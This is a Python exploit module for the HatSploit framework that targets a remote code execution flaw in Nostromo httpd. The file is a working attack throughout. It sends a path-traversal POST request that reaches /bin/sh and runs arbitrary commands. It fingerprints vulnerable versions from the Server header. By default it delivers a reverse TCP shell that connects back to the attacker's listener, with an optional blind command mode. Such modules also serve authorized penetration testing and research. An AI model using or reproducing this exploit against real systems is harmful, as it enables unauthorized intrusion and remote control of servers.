#!/usr/bin/env python3

#
# This module requires HatSploit: https://hatsploit.netlify.app
# Current source: https://github.com/EntySec/HatSploit
#

from hatsploit.lib.module import Module
from hatsploit.utils.handler import Handler
from hatsploit.utils.http import HTTPClient
from hatsploit.utils.tcp import TCPClient


class HatSploitModule(Module, Handler, HTTPClient, TCPClient):
    details = {
        'Name': "Nostromo Httpd Remote Code Execution",
        'Module': "exploit/linux/nostromo/remote_code_execution",
        'Authors': [
            'Ivan Nikolsky (enty8080) - module developer',
            'sp0re (sp0re) - vulnerability researcher'
        ],
        'Description': "Remote Code Execution in Nostromo Httpd.",
        'Comments': [
            ''
        ],
        'Platform': "linux",
        'Risk': "high"
    }

    payload = {
        'Description': "Payload to use.",
        'Value': "linux/x64/shell_reverse_tcp",
        'Categories': None,
        'Architectures': None,
        'Platforms': None,
        'Types': None
    }

    options = {
        'RHOST': {
            'Description': "Remote host.",
            'Value': None,
            'Type': "ip",
            'Required': True
        },
        'RPORT': {
            'Description': "Remote port.",
            'Value': 80,
            'Type': "port",
            'Required': True
        },
        'LHOST': {
            'Description': "Local host to listen on.",
            'Value': "0.0.0.0",
            'Type': "ip",
            'Required': True
        },
        'LPORT': {
            'Description': "Local port to listen on.",
            'Value': 8888,
            'Type': "port",
            'Required': True
        },
        'BLINDER': {
            'Description': "Use Blinder instead of payload.",
            'Value': "no",
            'Type': "boolean",
            'Required': False
        }
    }

    def exploit(self, remote_host, remote_port, command):
        payload = ""
        payload += "POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0\r\n"
        payload += "Content-Length: 1\r\n\r\necho\necho\n"
        payload += f"{command} 2>&1"

        client = self.open_tcp(remote_host, remote_port)

        if client.connect():
            client.send(payload.encode())

            response = client.recv(4096)
            response = response.decode()

            client.disconnect()
            response = response.split('\r\n\r\n', 1)

            if len(response) == 2:
                return response[1]

    def check(self, remote_host, remote_port):
        response = self.http_request(
            method="HEAD",
            host=remote_host,
            port=remote_port,
            path="/"
        )

        if response:
            if 'Server' in response.headers.keys():
                server = response.headers['Server']

                if int(server.split('.')[-1]) < 7:
                    return True

        self.output_error("Target is not vulnerable!")
        return False

    def run(self):
        remote_host, remote_port, local_host, local_port, blinder = self.parse_options(self.options)

        self.output_process(f"Exploiting {remote_host}...")

        if not self.check(remote_host, remote_port):
            self.output_error("Exploit failed!")
            return

        if blinder.lower() in ['yes', 'y']:
            self.blinder(
                sender=self.exploit,
                args=[remote_host, remote_port]
            )
        else:
            self.handle_session(
                host=local_host,
                port=local_port,
                remote_host=remote_host,

                payload=self.payload,

                sender=self.exploit,
                args=[remote_host, remote_port]
            )
